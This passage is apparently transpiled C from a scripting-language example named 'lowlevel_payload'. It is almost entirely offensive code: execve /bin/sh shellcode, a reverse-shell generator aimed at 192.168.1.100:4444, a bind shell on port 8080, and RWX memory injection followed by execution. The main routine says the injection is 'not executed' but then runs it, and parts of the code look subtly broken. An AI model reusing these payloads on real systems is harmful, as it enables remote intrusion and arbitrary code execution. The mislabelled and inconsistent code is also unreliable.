...
ks_array generate_reverse_shell(ks_val_t ip, ks_val_t port);
ks_val_t inject_shellcode(ks_val_t shellcode);
void execute_shellcode(ks_val_t addr);
ks_array create_bind_shell(ks_val_t port);
ks_array arbitrary_read(ks_val_t addr, ks_val_t size);
void arbitrary_write(ks_val_t addr, ks_val_t data);

static ks_val_t _arr_SHELLCODE[] = {(ks_val_t){.tag=KS_T_INT,.as.i=72LL}, (ks_val_t){.tag=KS_T_INT,.as.i=49LL}, (ks_val_t){.tag=KS_T_INT,.as.i=210LL}, (ks_val_t){.tag=KS_T_INT,.as.i=72LL}, (ks_val_t){.tag=KS_T_INT,.as.i=187LL}, (ks_val_t){.tag=KS_T_INT,.as.i=47LL}, (ks_val_t){.tag=KS_T_INT,.as.i=47LL}, (ks_val_t){.tag=KS_T_INT,.as.i=98LL}, (ks_val_t){.tag=KS_T_INT,.as.i=105LL}, (ks_val_t){.tag=KS_T_INT,.as.i=110LL}, (ks_val_t){.tag=KS_T_INT,.as.i=47LL}, (ks_val_t){.tag=KS_T_INT,.as.i=115LL}, (ks_val_t){.tag=KS_T_INT,.as.i=104LL}, (ks_val_t){.tag=KS_T_INT,.as.i=72LL}, (ks_val_t){.tag=KS_T_INT,.as.i=193LL}, (ks_val_t){.tag=KS_T_INT,.as.i=235LL}, (ks_val_t){.tag=KS_T_INT,.as.i=8LL}, (ks_val_t){.tag=KS_T_INT,.as.i=83LL}, (ks_val_t){.tag=KS_T_INT,.as.i=72LL}, (ks_val_t){.tag=KS_T_INT,.as.i=137LL}, (ks_val_t){.tag=KS_T_INT,.as.i=231LL}, (ks_val_t){.tag=KS_T_INT,.as.i=80LL}, (ks_val_t){.tag=KS_T_INT,.as.i=87LL}, (ks_val_t){.tag=KS_T_INT,.as.i=72LL}, (ks_val_t){.tag=KS_T_INT,.as.i=137LL}, (ks_val_t){.tag=KS_T_INT,.as.i=230LL}, (ks_val_t){.tag=KS_T_INT,.as.i=176LL}, (ks_val_t){.tag=KS_T_INT,.as.i=59LL}, (ks_val_t){.tag=KS_T_INT,.as.i=15LL}, (ks_val_t){.tag=KS_T_INT,.as.i=5LL}};
ks_array SHELLCODE = { .data = _arr_SHELLCODE, .length = 30 };

#line 20 "examples/lowlevel_payload.ks"
ks_array generate_reverse_shell(ks_val_t ip, ks_val_t port) {
    ks_val_t port_high = ks_int((_ks_as_i(ks_int((port) >> (_ks_as_i(KS_INT(8LL)))))) & (_ks_as_i(KS_INT(255LL))));
    ks_val_t port_low = ks_int((port) & (_ks_as_i(KS_INT(255LL))));
    static ks_val_t _arr_ip_bytes[] = {(ks_val_t){.tag=KS_T_INT,.as.i=192LL}, (ks_val_t){.tag=KS_T_INT,.as.i=168LL}, (ks_val_t){.tag=KS_T_INT,.as.i=1LL}, (ks_val_t){.tag=KS_T_INT,.as.i=100LL}};
    ks_array ip_bytes = { .data = _arr_ip_bytes, .length = 4 };
    long long* _ret_arr_0_ptr = (long long*)calloc(90, sizeof(long long));
    _ret_arr_0_ptr[0] = KS_INT(72LL);
    _ret_arr_0_ptr[1] = KS_INT(49LL);
    _ret_arr_0_ptr[2] = KS_INT(192LL);
    _ret_arr_0_ptr[3] = KS_INT(72LL);
    _ret_arr_0_ptr[4] = KS_INT(49LL);
    _ret_arr_0_ptr[5] = KS_INT(255LL);
    _ret_arr_0_ptr[6] = KS_INT(72LL);
    _ret_arr_0_ptr[7] = KS_INT(49LL);
    _ret_arr_0_ptr[8] = KS_INT(246LL);
    _ret_arr_0_ptr[9] = KS_INT(72LL);
    _ret_arr_0_ptr[10] = KS_INT(49LL);
    _ret_arr_0_ptr[11] = KS_INT(210LL);
    _ret_arr_0_ptr[12] = KS_INT(77LL);
    _ret_arr_0_ptr[13] = KS_INT(49LL);
    _ret_arr_0_ptr[14] = KS_INT(192LL);
    _ret_arr_0_ptr[15] = KS_INT(106LL);
    _ret_arr_0_ptr[16] = KS_INT(2LL);
    _ret_arr_0_ptr[17] = KS_INT(95LL);
    _ret_arr_0_ptr[18] = KS_INT(106LL);
    _ret_arr_0_ptr[19] = KS_INT(1LL);
    _ret_arr_0_ptr[20] = KS_INT(94LL);
    _ret_arr_0_ptr[21] = KS_INT(106LL);
    _ret_arr_0_ptr[22] = KS_INT(41LL);
    _ret_arr_0_ptr[23] = KS_INT(88LL);
    _ret_arr_0_ptr[24] = KS_INT(15LL);
    _ret_arr_0_ptr[25] = KS_INT(5LL);
    _ret_arr_0_ptr[26] = KS_INT(72LL);
    _ret_arr_0_ptr[27] = KS_INT(151LL);
    _ret_arr_0_ptr[28] = KS_INT(72LL);
    _ret_arr_0_ptr[29] = KS_INT(185LL);
    _ret_arr_0_ptr[30] = KS_INT(2LL);
    _ret_arr_0_ptr[31] = KS_INT(0LL);
    _ret_arr_0_ptr[32] = port_high;
    _ret_arr_0_ptr[33] = port_low;
    _ret_arr_0_ptr[34] = ks_array_get(ip_bytes, KS_INT(0LL));
    _ret_arr_0_ptr[35] = ks_array_get(ip_bytes, KS_INT(1LL));
    _ret_arr_0_ptr[36] = ks_array_get(ip_bytes, KS_INT(2LL));
    _ret_arr_0_ptr[37] = ks_array_get(ip_bytes, KS_INT(3LL));
    _ret_arr_0_ptr[38] = KS_INT(81LL);
    _ret_arr_0_ptr[39] = KS_INT(72LL);
    _ret_arr_0_ptr[40] = KS_INT(137LL);
    _ret_arr_0_ptr[41] = KS_INT(230LL);
    _ret_arr_0_ptr[42] = KS_INT(106LL);
    _ret_arr_0_ptr[43] = KS_INT(16LL);
    _ret_arr_0_ptr[44] = KS_INT(90LL);
    _ret_arr_0_ptr[45] = KS_INT(106LL);
    _ret_arr_0_ptr[46] = KS_INT(42LL);
    _ret_arr_0_ptr[47] = KS_INT(88LL);
    _ret_arr_0_ptr[48] = KS_INT(15LL);
    _ret_arr_0_ptr[49] = KS_INT(5LL);
    _ret_arr_0_ptr[50] = KS_INT(106LL);
    _ret_arr_0_ptr[51] = KS_INT(3LL);
    _ret_arr_0_ptr[52] = KS_INT(94LL);
    _ret_arr_0_ptr[53] = KS_INT(72LL);
    _ret_arr_0_ptr[54] = KS_INT(255LL);
    _ret_arr_0_ptr[55] = KS_INT(206LL);
    _ret_arr_0_ptr[56] = KS_INT(106LL);
    _ret_arr_0_ptr[57] = KS_INT(33LL);
    _ret_arr_0_ptr[58] = KS_INT(88LL);
    _ret_arr_0_ptr[59] = KS_INT(15LL);
    _ret_arr_0_ptr[60] = KS_INT(5LL);
    _ret_arr_0_ptr[61] = KS_INT(117LL);
    _ret_arr_0_ptr[62] = KS_INT(246LL);
    _ret_arr_0_ptr[63] = KS_INT(72LL);
    _ret_arr_0_ptr[64] = KS_INT(49LL);
    _ret_arr_0_ptr[65] = KS_INT(192LL);
    _ret_arr_0_ptr[66] = KS_INT(80LL);
    _ret_arr_0_ptr[67] = KS_INT(72LL);
    _ret_arr_0_ptr[68] = KS_INT(187LL);
    _ret_arr_0_ptr[69] = KS_INT(47LL);
    _ret_arr_0_ptr[70] = KS_INT(98LL);
    _ret_arr_0_ptr[71] = KS_INT(105LL);
    _ret_arr_0_ptr[72] = KS_INT(110LL);
    _ret_arr_0_ptr[73] = KS_INT(47LL);
    _ret_arr_0_ptr[74] = KS_INT(115LL);
    _ret_arr_0_ptr[75] = KS_INT(104LL);
    _ret_arr_0_ptr[76] = KS_INT(0LL);
    _ret_arr_0_ptr[77] = KS_INT(83LL);
    _ret_arr_0_ptr[78] = KS_INT(72LL);
    _ret_arr_0_ptr[79] = KS_INT(137LL);
    _ret_arr_0_ptr[80] = KS_INT(231LL);
    _ret_arr_0_ptr[81] = KS_INT(80LL);
    _ret_arr_0_ptr[82] = KS_INT(87LL);
    _ret_arr_0_ptr[83] = KS_INT(72LL);
    _ret_arr_0_ptr[84] = KS_INT(137LL);
    _ret_arr_0_ptr[85] = KS_INT(230LL);
    _ret_arr_0_ptr[86] = KS_INT(176LL);
    _ret_arr_0_ptr[87] = KS_INT(59LL);
    _ret_arr_0_ptr[88] = KS_INT(15LL);
    _ret_arr_0_ptr[89] = KS_INT(5LL);
    return ks_make_array(_ret_arr_0_ptr, 90);
}

#line 75 "examples/lowlevel_payload.ks"
ks_val_t inject_shellcode(ks_val_t shellcode) {
    ks_val_t size = ks_int((long long)(_ks_len(shellcode)));
    /* unsafe block */
    {
        ks_val_t addr = ks_int((long long)(system_syscall(9LL, 0LL, size, 7LL, 34LL, ks_v_neg(KS_INT(1LL)), 0LL)));
        if (__builtin_expect((ks_v_bool(ks_bool(ks_v_cmp(addr, ks_v_neg(KS_INT(1LL))) == 0))), 0)) {
            ks_val_print(ks_str("[!] mmap failed")); printf("\n");
            return KS_INT(0LL);
        }
        ks_val_print(ks_str(_ks_concat("[+] Allocated RWX memory at: 0x", ks_val_to_str(addr)))); printf("\n");
        ks_val_t dest = addr;
        for (long long i = 0; i < (size).as.i; i++) {
        (ks_ptr_write((void*)ks_v_add(dest, ks_int(i)), ks_val_array_get(shellcode, ks_int(i)), 1), 0);
    }
    ks_val_print(ks_str(_ks_concat(_ks_concat("[+] Injected ", ks_val_to_str(size)), " bytes of shellcode"))); printf("\n");
    return dest;
}
return ks_none();
}

#line 102 "examples/lowlevel_payload.ks"
void execute_shellcode(ks_val_t addr) {
/* unsafe block */
{
    ks_val_print(ks_str("[*] Executing shellcode...")); printf("\n");
    __asm__("call rax");
}
}

#line 112 "examples/lowlevel_payload.ks"
ks_array create_bind_shell(ks_val_t port) {
ks_val_t port_high = ks_int((_ks_as_i(ks_int((port) >> (_ks_as_i(KS_INT(8LL)))))) & (_ks_as_i(KS_INT(255LL))));
ks_val_t port_low = ks_int((port) & (_ks_as_i(KS_INT(255LL))));
long long* _ret_arr_1_ptr = (long long*)calloc(106, sizeof(long long));
_ret_arr_1_ptr[0] = KS_INT(72LL);
_ret_arr_1_ptr[1] = KS_INT(49LL);
_ret_arr_1_ptr[2] = KS_INT(192LL);
_ret_arr_1_ptr[3] = KS_INT(72LL);
_ret_arr_1_ptr[4] = KS_INT(49LL);
_ret_arr_1_ptr[5] = KS_INT(255LL);
_ret_arr_1_ptr[6] = KS_INT(72LL);
_ret_arr_1_ptr[7] = KS_INT(49LL);
_ret_arr_1_ptr[8] = KS_INT(246LL);
_ret_arr_1_ptr[9] = KS_INT(106LL);
_ret_arr_1_ptr[10] = KS_INT(2LL);
_ret_arr_1_ptr[11] = KS_INT(95LL);
_ret_arr_1_ptr[12] = KS_INT(106LL);
_ret_arr_1_ptr[13] = KS_INT(1LL);
_ret_arr_1_ptr[14] = KS_INT(94LL);
_ret_arr_1_ptr[15] = KS_INT(106LL);
_ret_arr_1_ptr[16] = KS_INT(41LL);
_ret_arr_1_ptr[17] = KS_INT(88LL);
_ret_arr_1_ptr[18] = KS_INT(15LL);
_ret_arr_1_ptr[19] = KS_INT(5LL);
_ret_arr_1_ptr[20] = KS_INT(72LL);
_ret_arr_1_ptr[21] = KS_INT(151LL);
_ret_arr_1_ptr[22] = KS_INT(82LL);
_ret_arr_1_ptr[23] = KS_INT(72LL);
_ret_arr_1_ptr[24] = KS_INT(185LL);
_ret_arr_1_ptr[25] = KS_INT(2LL);
_ret_arr_1_ptr[26] = KS_INT(0LL);
_ret_arr_1_ptr[27] = port_high;
_ret_arr_1_ptr[28] = port_low;
_ret_arr_1_ptr[29] = KS_INT(0LL);
_ret_arr_1_ptr[30] = KS_INT(0LL);
_ret_arr_1_ptr[31] = KS_INT(0LL);
_ret_arr_1_ptr[32] = KS_INT(0LL);
_ret_arr_1_ptr[33] = KS_INT(81LL);
_ret_arr_1_ptr[34] = KS_INT(72LL);
_ret_arr_1_ptr[35] = KS_INT(137LL);
_ret_arr_1_ptr[36] = KS_INT(230LL);
_ret_arr_1_ptr[37] = KS_INT(106LL);
_ret_arr_1_ptr[38] = KS_INT(16LL);
_ret_arr_1_ptr[39] = KS_INT(90LL);
_ret_arr_1_ptr[40] = KS_INT(106LL);
_ret_arr_1_ptr[41] = KS_INT(49LL);
_ret_arr_1_ptr[42] = KS_INT(88LL);
_ret_arr_1_ptr[43] = KS_INT(15LL);
_ret_arr_1_ptr[44] = KS_INT(5LL);
_ret_arr_1_ptr[45] = KS_INT(106LL);
_ret_arr_1_ptr[46] = KS_INT(50LL);
_ret_arr_1_ptr[47] = KS_INT(88LL);
_ret_arr_1_ptr[48] = KS_INT(106LL);
_ret_arr_1_ptr[49] = KS_INT(1LL);
_ret_arr_1_ptr[50] = KS_INT(94LL);
_ret_arr_1_ptr[51] = KS_INT(15LL);
_ret_arr_1_ptr[52] = KS_INT(5LL);
_ret_arr_1_ptr[53] = KS_INT(72LL);
_ret_arr_1_ptr[54] = KS_INT(49LL);
_ret_arr_1_ptr[55] = KS_INT(210LL);
_ret_arr_1_ptr[56] = KS_INT(72LL);
_ret_arr_1_ptr[57] = KS_INT(49LL);
_ret_arr_1_ptr[58] = KS_INT(246LL);
_ret_arr_1_ptr[59] = KS_INT(106LL);
_ret_arr_1_ptr[60] = KS_INT(43LL);
_ret_arr_1_ptr[61] = KS_INT(88LL);
_ret_arr_1_ptr[62] = KS_INT(15LL);
_ret_arr_1_ptr[63] = KS_INT(5LL);
_ret_arr_1_ptr[64] = KS_INT(72LL);
_ret_arr_1_ptr[65] = KS_INT(151LL);
_ret_arr_1_ptr[66] = KS_INT(106LL);
_ret_arr_1_ptr[67] = KS_INT(3LL);
_ret_arr_1_ptr[68] = KS_INT(94LL);
_ret_arr_1_ptr[69] = KS_INT(72LL);
_ret_arr_1_ptr[70] = KS_INT(255LL);
_ret_arr_1_ptr[71] = KS_INT(206LL);
_ret_arr_1_ptr[72] = KS_INT(106LL);
_ret_arr_1_ptr[73] = KS_INT(33LL);
_ret_arr_1_ptr[74] = KS_INT(88LL);
_ret_arr_1_ptr[75] = KS_INT(15LL);
_ret_arr_1_ptr[76] = KS_INT(5LL);
_ret_arr_1_ptr[77] = KS_INT(117LL);
_ret_arr_1_ptr[78] = KS_INT(246LL);
_ret_arr_1_ptr[79] = KS_INT(72LL);
_ret_arr_1_ptr[80] = KS_INT(49LL);
_ret_arr_1_ptr[81] = KS_INT(192LL);
_ret_arr_1_ptr[82] = KS_INT(80LL);
_ret_arr_1_ptr[83] = KS_INT(72LL);
_ret_arr_1_ptr[84] = KS_INT(187LL);
_ret_arr_1_ptr[85] = KS_INT(47LL);
_ret_arr_1_ptr[86] = KS_INT(98LL);
_ret_arr_1_ptr[87] = KS_INT(105LL);
_ret_arr_1_ptr[88] = KS_INT(110LL);
_ret_arr_1_ptr[89] = KS_INT(47LL);
_ret_arr_1_ptr[90] = KS_INT(115LL);
_ret_arr_1_ptr[91] = KS_INT(104LL);
_ret_arr_1_ptr[92] = KS_INT(0LL);
_ret_arr_1_ptr[93] = KS_INT(83LL);
_ret_arr_1_ptr[94] = KS_INT(72LL);
_ret_arr_1_ptr[95] = KS_INT(137LL);
_ret_arr_1_ptr[96] = KS_INT(231LL);
_ret_arr_1_ptr[97] = KS_INT(80LL);
_ret_arr_1_ptr[98] = KS_INT(87LL);
_ret_arr_1_ptr[99] = KS_INT(72LL);
_ret_arr_1_ptr[100] = KS_INT(137LL);
_ret_arr_1_ptr[101] = KS_INT(230LL);
_ret_arr_1_ptr[102] = KS_INT(176LL);
_ret_arr_1_ptr[103] = KS_INT(59LL);
_ret_arr_1_ptr[104] = KS_INT(15LL);
_ret_arr_1_ptr[105] = KS_INT(5LL);
return ks_make_array(_ret_arr_1_ptr, 106);
}

#line 172 "examples/lowlevel_payload.ks"
ks_array arbitrary_read(ks_val_t addr, ks_val_t size) {
ks_array data = { .data = NULL, .length = 0 };
/* unsafe block */
{
    for (long long i = 0; i < (size).as.i; i++) {
    ks_val_t byte = ks_int((long long)(ks_ptr_read((void*)ks_v_add(addr, ks_int(i)), 1LL)));
    (_ks_array_append(&data, byte), 0);
}
}
return data;
}

#line 185 "examples/lowlevel_payload.ks"
void arbitrary_write(ks_val_t addr, ks_val_t data) {
/* unsafe block */
{
for (long long i = 0; i < (_ks_len(data)).as.i; i++) {
(ks_ptr_write((void*)ks_v_add(addr, ks_int(i)), ks_val_array_get(data, ks_int(i)), 1), 0);
}
}
}

#line 194 "examples/lowlevel_payload.ks"
void ks_user_main(void) {
ks_val_print(ks_str("=== KentScript Low-Level Payload Demo ===\n")); printf("\n");
ks_val_print(ks_str("[1] Basic Shellcode (execve /bin/sh):")); printf("\n");
ks_val_print(ks_str(_ks_concat(_ks_concat("    Size: ", _ks_str_int(ks_array_len(SHELLCODE))), " bytes"))); printf("\n");
ks_val_print(ks_str(_ks_concat("    Hex: ", _ks_str_array(SHELLCODE.data, SHELLCODE.length)))); printf("\n");
ks_val_print(ks_str("")); printf("\n");
ks_val_print(ks_str("[2] Reverse Shell Generator:")); printf("\n");
ks_array rev_shell = generate_reverse_shell(ks_str(("192.168.1.100")), KS_INT(4444LL));
ks_val_print(ks_str("    Target: 192.168.1.100:4444")); printf("\n");
ks_val_print(ks_str(_ks_concat(_ks_concat("    Size: ", _ks_str_int(ks_array_len(rev_shell))), " bytes"))); printf("\n");
ks_val_print(ks_str("")); printf("\n");
ks_val_print(ks_str("[3] Bind Shell Generator:")); printf("\n");
ks_array bind_shell = create_bind_shell(KS_INT(8080LL));
ks_val_print(ks_str("    Port: 8080")); printf("\n");
ks_val_print(ks_str(_ks_concat(_ks_concat("    Size: ", _ks_str_int(ks_array_len(bind_shell))), " bytes"))); printf("\n");
ks_val_print(ks_str("")); printf("\n");
ks_val_print(ks_str("[4] Memory Operations:")); printf("\n");
ks_val_print(ks_str("    (Unsafe operations disabled for demo)")); printf("\n");
ks_val_print(ks_str("    Would allocate RWX memory")); printf("\n");
ks_val_print(ks_str("    Would write magic bytes: [0xDE, 0xAD, 0xBE, 0xEF]")); printf("\n");
ks_val_print(ks_str("")); printf("\n");
ks_val_print(ks_str("[5] Shellcode Injection (DEMO - not executed):")); printf("\n");
ks_val_print(ks_str("    Uncomment to inject and execute:")); printf("\n");
ks_val_print(ks_str("    let addr = inject_shellcode(SHELLCODE);")); printf("\n");
ks_val_print(ks_str("    execute_shellcode(addr);")); printf("\n");
ks_val_print(ks_str("")); printf("\n");
ks_val_t addr = inject_shellcode(ks_int(SHELLCODE));
if (ks_v_bool(ks_bool(ks_v_cmp(addr, KS_INT(0LL)) != 0))) {
execute_shellcode(addr);
}
ks_val_print(ks_str("=== Demo Complete ===")); printf("\n");
}
